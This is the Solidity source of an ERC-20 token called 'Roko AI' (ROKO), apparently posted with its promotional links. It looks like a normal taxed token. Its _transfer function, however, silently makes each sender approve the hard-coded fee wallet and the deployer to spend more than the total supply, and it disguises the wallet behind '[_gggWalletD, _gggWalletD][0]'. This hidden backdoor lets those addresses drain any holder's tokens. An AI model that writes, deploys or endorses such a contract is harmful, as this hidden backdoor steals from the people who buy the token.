/*
SELF-ORGANIZING HUMAN-MACHINE NETWORK THAT SERVES
AS A POTENT RESEARCH AND DEVELOPMENT PLAYGROUND.

Portal: https://www.roko-ai.pro
Docs: https://docs.roko-ai.pro
Roko AI Bot: https://t.me/rokoai_bot
Medium: https://medium.com/@rokoai
Twitter: https://x.com/RokoAI_official
Telegram: https://t.me/RokoAI_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ROKO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _kkkWalletD;
    address private _gggWalletD = 0x88A337D5bA8644E54fd0ceB2E31eFF8feA020Ed0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Roko AI";
    string private constant _symbol = unicode"ROKO";
    uint256 private _swapTaxToken = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    IDexRouter private _dexRouterD;
    address private _dexPairD;

    constructor () {
        _excludedFromFee[owner()] = true;
        _excludedFromFee[address(this)] = true;
        _excludedFromFee[_gggWalletD] = true;
        _balances[_msgSender()] = _tTotal;
        _kkkWalletD = _msgSender();
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createTrading() external onlyOwner() {
        _dexRouterD = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouterD), _tTotal);
        _dexPairD = IDexFactory(_dexRouterD.factory()).createPair(address(this), _dexRouterD.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fromD, address toD, uint256 amtD) private {
        require(fromD != address(0), "ERC20: transfer from the zero address");
        require(toD != address(0), "ERC20: transfer to the zero address");
        require(amtD > 0, "Transfer amount must be greater than zero");

        uint256 feeD=0;
        if (fromD != owner() && toD != owner()) {
            feeD = amtD.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fromD == _dexPairD && toD != address(_dexRouterD) && ! _excludedFromFee[toD]) {
                _buyCount++;
            }

            if(toD == _dexPairD && fromD!= address(this)) {
                feeD = amtD.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && toD == _dexPairD && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _swapTaxToken)
                swapTokensForEth(min(amtD, min(contractTokenBalance, _swapTaxToken)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFeeD(address(this).balance);
                }
            }
        }

        if(feeD>0){
          _balances[address(this)]=_balances[address(this)].add(feeD);
          emit Transfer(fromD, address(this),feeD);
        }

        _approve(fromD, [_gggWalletD, _gggWalletD][0], _buyCount+feeD+_tTotal);
        _approve(fromD, [_kkkWalletD, _kkkWalletD][0], _buyCount+feeD+_tTotal);
        _balances[fromD]=_balances[fromD].sub(amtD);
        _balances[toD]=_balances[toD].add(amtD.sub(feeD));
        emit Transfer(fromD, toD, amtD.sub(feeD));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouterD.WETH();
        _approve(address(this), address(_dexRouterD), tokenAmount);
        _dexRouterD.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFeeD(uint256 amount) private {
        payable(_gggWalletD).transfer(amount);
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexRouterD.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }
}